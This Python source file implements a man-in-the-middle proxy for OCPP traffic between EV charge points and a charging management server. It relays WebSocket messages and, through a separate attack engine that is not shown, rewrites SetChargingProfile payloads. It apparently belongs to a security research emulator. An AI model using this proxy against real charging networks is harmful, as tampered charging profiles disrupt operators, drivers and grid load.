"""
MITM Proxy for OCPP communication interception
"""

import asyncio
import logging
from typing import Optional, Dict, Set
import websockets
from websockets.server import WebSocketServerProtocol
from websockets.client import WebSocketClientProtocol
import json

from .ocpp_parser import OCPPMessageParser, OCPPVersion

logger = logging.getLogger(__name__)


class OCPPMITMProxy:
    """
    Man-in-the-Middle proxy for OCPP communication
    Extends existing EmuOCPP mitm.py functionality
    """
    
    def __init__(self, csms_host: str, csms_port: int, 
                 listen_port: int, attack_engine=None):
        """
        Initialize proxy with CSMS connection details and attack engine
        
        Args:
            csms_host: CSMS server hostname
            csms_port: CSMS server port
            listen_port: Port to listen for Charge Point connections
            attack_engine: Optional AttackEngine instance for message manipulation
        """
        self.csms_host = csms_host
        self.csms_port = csms_port
        self.listen_port = listen_port
        self.attack_engine = attack_engine
        self.server = None
        self.active_connections: Set[asyncio.Task] = set()
        self._running = False
        self.ocpp_parsers: Dict[str, OCPPMessageParser] = {}  # Per-connection parsers
        logger.info(f"OCPPMITMProxy initialized: listening on port {listen_port}, "
                   f"forwarding to {csms_host}:{csms_port}")
    
    async def start(self) -> None:
        """
        Start proxy server and begin intercepting messages
        """
        logger.info("Starting MITM proxy server...")
        self._running = True
        
        try:
            # Start WebSocket server to listen for Charge Point connections
            self.server = await websockets.serve(
                self.handle_client_connection,
                "0.0.0.0",
                self.listen_port,
                subprotocols=["ocpp1.6", "ocpp2.0", "ocpp2.0.1"]
            )
            logger.info(f"MITM proxy listening on port {self.listen_port}")
            
            # Keep server running
            await asyncio.Future()  # Run forever
            
        except Exception as e:
            logger.error(f"Error starting MITM proxy: {e}")
            raise
    
    async def handle_client_connection(self, client_ws: WebSocketServerProtocol, path: str) -> None:
        """
        Handle incoming Charge Point connection
        
        Args:
            client_ws: WebSocket connection from Charge Point
            path: WebSocket path (typically contains charge point ID)
        """
        logger.info(f"New client connection on path: {path}")
        server_ws = None
        
        try:
            # Extract charge point ID from path
            charge_point_id = path.strip('/') if path else "unknown"
            logger.info(f"Charge Point ID: {charge_point_id}")
            
            # Get the subprotocol negotiated with the client
            client_subprotocol = client_ws.subprotocol
            logger.info(f"Client subprotocol: {client_subprotocol}")
            
            # Create OCPP parser for this connection based on detected version
            parser = OCPPMessageParser()
            ocpp_version = parser.detect_version(client_subprotocol)
            parser.version = ocpp_version
            self.ocpp_parsers[charge_point_id] = parser
            logger.info(f"OCPP version detected: {ocpp_version.value}")
            
            # Establish connection to CSMS server
            csms_uri = f"ws://{self.csms_host}:{self.csms_port}{path}"
            logger.info(f"Connecting to CSMS at: {csms_uri}")
            
            # Connect to CSMS with the same subprotocol
            subprotocols = [client_subprotocol] if client_subprotocol else ["ocpp1.6", "ocpp2.0", "ocpp2.0.1"]
            server_ws = await websockets.connect(
                csms_uri,
                subprotocols=subprotocols
            )
            logger.info(f"Connected to CSMS with subprotocol: {server_ws.subprotocol}")
            
            # Create bidirectional message forwarding tasks
            client_to_server_task = asyncio.create_task(
                self._forward_messages(client_ws, server_ws, "client_to_server", charge_point_id)
            )
            server_to_client_task = asyncio.create_task(
                self._forward_messages(server_ws, client_ws, "server_to_client", charge_point_id)
            )
            
            # Track active connections
            self.active_connections.add(client_to_server_task)
            self.active_connections.add(server_to_client_task)
            
            # Wait for either task to complete (connection closed)
            done, pending = await asyncio.wait(
                [client_to_server_task, server_to_client_task],
                return_when=asyncio.FIRST_COMPLETED
            )
            
            # Cancel remaining tasks
            for task in pending:
                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass
            
            logger.info(f"Connection closed for charge point: {charge_point_id}")
            
        except Exception as e:
            logger.error(f"Error handling client connection: {e}")
        finally:
            # Clean up connections
            if server_ws:
                await server_ws.close()
            await client_ws.close()
            
            # Remove from active connections
            self.active_connections.discard(client_to_server_task)
            self.active_connections.discard(server_to_client_task)
            
            # Remove parser for this connection
            if charge_point_id in self.ocpp_parsers:
                del self.ocpp_parsers[charge_point_id]
    
    async def _forward_messages(self, source_ws, dest_ws, direction: str, charge_point_id: str) -> None:
        """
        Forward messages from source to destination WebSocket
        
        Args:
            source_ws: Source WebSocket
            dest_ws: Destination WebSocket
            direction: 'client_to_server' or 'server_to_client'
            charge_point_id: Charge point identifier for logging
        """
        try:
            async for message in source_ws:
                logger.debug(f"[{charge_point_id}] Message ({direction}): {message[:200]}...")
                
                # Intercept and potentially modify the message
                modified_message = await self.intercept_message(message, direction, charge_point_id)
                
                # Forward the (potentially modified) message
                await dest_ws.send(modified_message)
                
        except websockets.exceptions.ConnectionClosed:
            logger.info(f"[{charge_point_id}] WebSocket connection closed ({direction})")
        except Exception as e:
            logger.error(f"[{charge_point_id}] Error forwarding messages ({direction}): {e}")
    
    async def intercept_message(self, message: str, direction: str, charge_point_id: str = "unknown") -> str:
        """
        Intercept and potentially modify OCPP message
        
        Args:
            message: JSON-encoded OCPP message
            direction: 'client_to_server' or 'server_to_client'
            charge_point_id: Charge point identifier for parser lookup
            
        Returns:
            Modified or original message
        """
        try:
            # Parse OCPP message
            ocpp_message = json.loads(message)
            
            # OCPP messages format: [MessageTypeId, MessageId, Action, Payload]
            # MessageTypeId: 2 = CALL, 3 = CALLRESULT, 4 = CALLERROR
            if not isinstance(ocpp_message, list) or len(ocpp_message) < 3:
                logger.debug(f"Non-standard OCPP message format, forwarding unchanged")
                return message
            
            message_type_id = ocpp_message[0]
            message_id = ocpp_message[1]
            
            # Get the parser for this connection
            parser = self.ocpp_parsers.get(charge_point_id)
            if not parser:
                logger.warning(f"No parser found for charge point {charge_point_id}, forwarding unchanged")
                return message
            
            # Only process CALL messages (type 2) with action
            if message_type_id == 2 and len(ocpp_message) >= 4:
                action = ocpp_message[2]
                payload = ocpp_message[3]
                
                logger.debug(f"Intercepted {action} message (ID: {message_id}, direction: {direction}, version: {parser.version.value})")
                
                # Check if this is a SetChargingProfile message
                if parser.is_set_charging_profile_action(action):
                    logger.info(f"SetChargingProfile message detected (ID: {message_id}, version: {parser.version.value})")
                    
                    # Apply attack manipulation if attack engine is configured
                    if self.attack_engine and self.attack_engine.should_manipulate(ocpp_message):
                        logger.info(f"Applying attack manipulation to message {message_id}")
                        modified_payload = self._manipulate_payload(payload, action, parser)
                        ocpp_message[3] = modified_payload
                        
                        # Convert back to JSON
                        modified_message = json.dumps(ocpp_message)
                        logger.info(f"Message {message_id} manipulated successfully")
                        return modified_message
                    else:
                        logger.debug(f"Attack engine not configured or manipulation disabled")
                else:
                    logger.debug(f"Non-targeted message type: {action}, forwarding unchanged")
            else:
                logger.debug(f"Message type {message_type_id}, forwarding unchanged")
            
            # Return original message if no manipulation applied
            return message
            
        except json.JSONDecodeError as e:
            logger.warning(f"Failed to parse message as JSON: {e}, forwarding unchanged")
            return message
        except Exception as e:
            logger.error(f"Error intercepting message: {e}, forwarding unchanged")
            return message
    
    def _manipulate_payload(self, payload: Dict, action: str, parser: OCPPMessageParser) -> Dict:
        """
        Manipulate the message payload using the attack engine
        
        Args:
            payload: Original message payload
            action: OCPP action name
            parser: OCPP parser for version-specific handling
            
        Returns:
            Modified payload
        """
        try:
            # Parse charging profile using version-specific parser
            profile = parser.parse_set_charging_profile(payload)
            
            if profile:
                logger.debug(f"Extracted charging profile for manipulation (version: {parser.version.value})")
                modified_profile = self.attack_engine.manipulate_charging_profile(profile)
                
                # Update payload with modified profile based on version
                if parser.version == OCPPVersion.OCPP_16:
                    payload['csChargingProfiles'] = modified_profile
                elif parser.version in [OCPPVersion.OCPP_20, OCPPVersion.OCPP_201]:
                    payload['chargingProfile'] = modified_profile
                else:
                    logger.warning(f"Unknown OCPP version: {parser.version}")
            else:
                logger.warning(f"Could not extract charging profile from payload")
            
            return payload
            
        except Exception as e:
            logger.error(f"Error manipulating payload: {e}")
            return payload
    
    def stop(self) -> None:
        """
        Gracefully shutdown proxy and close connections
        """
        logger.info("Stopping MITM proxy...")
        self._running = False
        
        # Cancel all active connection tasks
        for task in self.active_connections:
            if not task.done():
                task.cancel()
        
        # Close the server
        if self.server:
            self.server.close()
            logger.info("MITM proxy server closed")
        
        logger.info("MITM proxy stopped successfully")
